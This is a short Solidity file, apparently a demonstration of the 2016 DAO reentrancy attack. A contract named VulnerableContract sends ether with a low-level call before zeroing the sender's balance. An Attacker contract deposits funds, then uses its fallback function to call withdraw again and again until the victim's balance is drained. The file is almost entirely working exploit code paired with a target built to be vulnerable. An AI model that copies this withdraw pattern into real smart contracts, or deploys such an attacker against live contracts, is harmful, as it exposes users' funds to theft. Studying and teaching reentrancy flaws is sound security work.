//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

contract VulnerableContract{
    mapping(address => uint ) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0);
       /// payable(msg.sender).transfer(balance);
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to sent eth");
        balances[msg.sender] = 0;
    }
    
    function getBalance() external view returns (uint){
        return address(this).balance;
    }   
}

contract Attacker{
    
    VulnerableContract public DAO2016;

    constructor(address _deposit){
        DAO2016 = VulnerableContract(_deposit);
    }


    function attack() external payable{
        require(msg.value > 0 ether);
        DAO2016.deposit{value: msg.value }();
        DAO2016.withdraw();
    }
    
    fallback () external payable{
        if(address(DAO2016).balance > 0 ether){
            DAO2016.withdraw();
        }
    }

    function getBalance() external view returns (uint){
        return address(this).balance;
    }
}
